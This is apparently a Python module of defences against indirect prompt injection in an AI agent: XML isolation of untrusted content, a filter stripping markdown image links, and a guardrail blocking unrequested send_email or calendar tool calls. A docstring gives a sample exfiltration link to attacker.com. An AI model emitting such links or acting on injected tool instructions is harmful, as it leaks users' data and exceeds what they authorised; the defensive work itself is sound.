"""
Defensive mitigations against Indirect Prompt Injection:
1. Structural XML Isolation (Data-Instruction Boundary)
2. Intent Alignment Guardrail (Tool-Call Verification)
3. Human-in-the-Loop / Privilege Gate
4. Content Output Sanitization (Blocking Markdown tracking images)
"""

import re
from typing import Dict, Any, Tuple

class DataSanitizer:
    @staticmethod
    def wrap_untrusted_data(data_type: str, item_id: str, content: str) -> str:
        """
        Encloses untrusted third-party data within strict XML boundary tags.
        """
        # Escape any existing closing tags to avoid delimiter collision
        escaped_content = content.replace("</untrusted_external_content>", "&lt;/untrusted_external_content&gt;")
        return (
            f'<untrusted_external_content type="{data_type}" id="{item_id}">\n'
            f"{escaped_content}\n"
            f"</untrusted_external_content>"
        )

    @staticmethod
    def sanitize_output(output_text: str) -> Tuple[str, bool]:
        """
        Detects and strips markdown image exfiltration payloads like ![img](https://attacker.com/leak?q=...).
        """
        pattern = r"!\[.*?\]\((https?://[^\s\)]+)\)"
        matches = re.findall(pattern, output_text)
        if matches:
            cleaned = re.sub(pattern, "[BLOCKED_UNTRUSTED_EXTERNAL_IMAGE]", output_text)
            return cleaned, True
        return output_text, False


class IntentGuardrail:
    @staticmethod
    def verify_tool_invocation(user_goal: str, tool_name: str, tool_args: Dict[str, Any]) -> Tuple[bool, str]:
        """
        Inspects if a proposed tool call aligns with the original user goal.
        Flags unauthorized tool calls (e.g. sending emails when the user only asked to read/summarize).
        """
        goal_lower = user_goal.lower()

        # Check: Did user ask to send or forward email?
        if tool_name == "send_email":
            allowed_verbs = ["send", "forward", "reply", "email", "mail to", "отправь", "перешли", "напиши"]
            is_requested_by_user = any(verb in goal_lower for verb in allowed_verbs)

            if not is_requested_by_user:
                return False, (
                    f"GUARDRAIL BLOCKED: Model attempted 'send_email' to '{tool_args.get('to')}', "
                    f"but user goal was only to '{user_goal}'. Potential Indirect Prompt Injection detected!"
                )

        # Check: Did user ask to create calendar events?
        if tool_name == "create_calendar_event":
            allowed_verbs = ["calendar", "schedule", "meeting", "календарь", "встреча", "запланируй"]
            is_requested_by_user = any(verb in goal_lower for verb in allowed_verbs)

            if not is_requested_by_user:
                return False, (
                    f"GUARDRAIL BLOCKED: Model attempted 'create_calendar_event', "
                    f"not authorized in user goal '{user_goal}'."
                )

        return True, "Tool call authorized"
